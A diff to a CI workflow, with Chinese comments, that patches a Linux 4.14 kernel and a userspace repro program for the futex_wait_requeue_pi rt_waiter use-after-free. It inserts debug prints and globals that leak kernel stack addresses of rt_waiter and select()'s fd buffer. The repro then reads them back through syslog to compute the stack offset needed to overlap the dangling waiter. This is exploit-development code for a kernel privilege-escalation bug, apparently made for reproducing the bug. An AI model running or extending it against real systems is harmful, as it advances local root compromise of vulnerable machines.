@@ -51,6 +51,8 @@ jobs:
                           s = s.replace(decl,
                                         'unsigned char ghostlock_bootid_%s' % cand)
                           s = s.replace('&%s' % cand, '&ghostlock_bootid_%s' % cand)
+                          if 'ghostlock_scratch' not in s:
+                              s += '\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));\n'
                           open(fn, 'w').write(s)
                           break
                   if boot_name:
@@ -58,43 +60,58 @@ jobs:
               if boot_name:
                   break
           assert boot_name, 'boot_id buffer not found'
-          # 在 random.c 里加 scratch 全局（插到第一个 #include 之后）
-          s = open(target_file).read()
-          if 'ghostlock_scratch' not in s:
-              idx = s.find('#include')
-              assert idx >= 0, 'no include in %s' % target_file
-              eol = s.find('\n', idx)
-              s = s[:eol+1] + '\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));\n' + s[eol+1:]
-              open(target_file, 'w').write(s)
           print('boot buffer:', boot_name, 'in', target_file)
 
-          # 2) ghost delta print: futex_wait_requeue_pi 的栈局部 rt_waiter
+          # 2) ghost delta capture: futex_wait_requeue_pi 的栈局部 rt_waiter
+          #    地址写进全局 ghostlock_scratch[0]（System.map 有符号，repro 已知地址）
           f = open('linux-g/kernel/futex.c').read()
+          if 'extern unsigned long ghostlock_scratch' not in f:
+              fidx = f.find('#include')
+              feol = f.find('\n', fidx)
+              f = f[:feol+1] + '\nextern unsigned long ghostlock_scratch[8];\n' + f[feol+1:]
           needle = 'struct rt_mutex_waiter rt_waiter;'
           cnt = f.count(needle)
           if cnt >= 2:
               # 第二个声明是 futex_wait_requeue_pi 里的（第一个是 futex_lock_pi 路径）
               idx = f.rfind(needle)
-              f = f[:idx+len(needle)] + '\n\tpr_info("DBG rt_waiter=%px\\n", &rt_waiter);' + f[idx+len(needle):]
-              print('futex.c rt_waiter print OK (total decls=%d)' % cnt)
+              cap = ("\n\tpr_info(\"DBG rt_waiter=%px\\n\", &rt_waiter);\n"
+                     "\tghostlock_scratch[0] = (unsigned long)&rt_waiter;")
+              f = f[:idx+len(needle)] + cap + f[idx+len(needle):]
+              print('futex.c rt_waiter capture OK (total decls=%d)' % cnt)
           elif cnt == 1:
               f = f.replace(needle, needle + '\n\tpr_info("DBG rt_waiter=%px\\n", &rt_waiter);', 1)
-              print('futex.c rt_waiter print OK (single decl)')
+              print('futex.c rt_waiter capture OK (single decl)')
           else:
-              print('futex.c rt_waiter print WARN: needle missing')
+              print('futex.c rt_waiter capture WARN: needle missing')
           open('linux-g/kernel/futex.c','w').write(f)
 
-          # 3) stack_fds print in fs/select.c core_sys_select（稳定 needle：do_select 调用前）
+          # 3) stack_fds capture in fs/select.c core_sys_select：局部变量叫 fds
+          #    （4.14 的 core_sys_select 里是 fd_set_bits fds），写进 ghostlock_scratch[1]
+          #    并打印 DBG delta —— console 直接可见，guest 内不依赖 /dev/kmsg 回读
           g = open('linux-g/fs/select.c').read()
+          if 'extern unsigned long ghostlock_scratch' not in g:
+              gidx = g.find('#include')
+              geol = g.find('\n', gidx)
+              g = g[:geol+1] + '\nextern unsigned long ghostlock_scratch[8];\n' + g[geol+1:]
           done = False
           for needle in ('ret = do_select(n, &fds, end_time);',
                          'ret = do_select(n, &fds, &end_time);'):
               if needle in g:
-                  g = g.replace(needle, 'pr_info("DBG stack_fds=%px\\n", stack_fds);\n\t' + needle, 1)
+                  cap = ("pr_info(\"DBG stack_fds=%px\\n\", &fds);\n\t"
+                         "ghostlock_scratch[1] = (unsigned long)&fds;\n\t"
+                         "pr_info(\"DBG delta=%ld\\n\","
+                         " (long)ghostlock_scratch[1] - (long)ghostlock_scratch[0]);\n\t"
+                         + needle)
+                  g = g.replace(needle, cap, 1)
                   open('linux-g/fs/select.c', 'w').write(g)
                   done = True
                   break
-          print('select.c stack_fds print:', 'OK' if done else 'WARN')
+          print('select.c stack_fds capture:', 'OK' if done else 'WARN')
+          import subprocess
+          print('--- injected select.c lines ---')
+          subprocess.run(['grep', '-n', 'DBG ', 'linux-g/fs/select.c'])
+          print('--- injected futex.c line ---')
+          subprocess.run(['grep', '-n', 'ghostlock_scratch', 'linux-g/kernel/futex.c'])
 
           # 4) proxy lock + requeue markers (keep v9 instrumentation)
           reps = [
@@ -154,6 +171,7 @@ jobs:
           #include <linux/futex.h>
           #include <linux/sched.h>
           #include <sys/select.h>
+          #include <sys/syslog.h>
           #include <time.h>
           #include <fcntl.h>
           #include <stdlib.h>
@@ -322,16 +340,25 @@ jobs:
             return edeadlk ? 35 : rq;
           }
 
-          static void find_delta(unsigned long *qwaiter, unsigned long *sfds) {
-            *qwaiter = *sfds = 0;
-            int fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
-            if (fd < 0) { printf("REPRO kmsg open failed errno=%d\n", errno); return; }
-            char buf[262144];
-            ssize_t n = read(fd, buf, sizeof(buf)-1);
-            close(fd);
-            if (n <= 0) { printf("REPRO kmsg read n=%zd\n", n); return; }
+          static void find_delta(unsigned long *qwaiter, unsigned long *sfds, long *pdelta) {
+            *qwaiter = *sfds = 0; *pdelta = 0;
+            /* SYSLOG_ACTION_READ_ALL(3): 读整个 ring buffer，非消费、无 <n> 前缀 */
+            long sz = syscall(SYS_syslog, 3, NULL, 0);
+            if (sz <= 0 || sz > (1<<20)) {
+              printf("REPRO klog size fail sz=%ld errno=%d\n", sz, errno);
+              return;
+            }
+            char *buf = malloc((size_t)sz + 1);
+            if (!buf) { printf("REPRO malloc fail\n"); return; }
+            long n = syscall(SYS_syslog, 3, buf, (int)sz);
+            if (n < 0) { printf("REPRO klog read fail n=%ld errno=%d\n", n, errno); free(buf); return; }
             buf[n] = 0;
             char *p = buf;
+            while ((p = strstr(p, "DBG delta=")) != NULL) {
+              *pdelta = strtol(p + 10, NULL, 10);
+              p += 10;
+            }
+            p = buf;
             while ((p = strstr(p, "DBG rt_waiter=")) != NULL) {
               *qwaiter = strtoull(p + 14, NULL, 16);
               p += 14;
@@ -341,7 +368,12 @@ jobs:
               *sfds = strtoull(p + 14, NULL, 16);
               p += 14;
             }
-            printf("REPRO delta parse q_waiter=%016lx stack_fds=%016lx\n", *qwaiter, *sfds);
+            printf("REPRO delta parse q_waiter=%016lx stack_fds=%016lx klog_delta=%ld klog_bytes=%ld\n",
+                   *qwaiter, *sfds, *pdelta, n);
+            if (!*qwaiter) {   /* debug: dump tail of klog */
+              printf("REPRO klog tail: %.600s\n", buf + (n > 600 ? n - 600 : 0));
+            }
+            free(buf);
           }
 
           int main(void) {
@@ -354,10 +386,13 @@ jobs:
             printf("REPRO measure\n");
             run_measure(0);
 
-            unsigned long qwaiter = 0, sfds = 0;
-            find_delta(&qwaiter, &sfds);
+            unsigned long qwaiter = 0, sfds = 0; long pdelta = 0;
+            find_delta(&qwaiter, &sfds, &pdelta);
             int shift = -1;
-            if (qwaiter && sfds) {
+            if (pdelta > 0 && (pdelta % 8) == 0 && (pdelta / 8) < 40) {
+              shift = (int)(pdelta / 8);
+              printf("REPRO computed shift=%d (from klog delta=%ld)\n", shift, pdelta);
+            } else if (qwaiter && sfds) {
               long d = (long)(qwaiter - sfds);
               printf("REPRO raw delta=%ld\n", d);
               if (d >= 0 && (d % 8) == 0 && (d / 8) < 40)
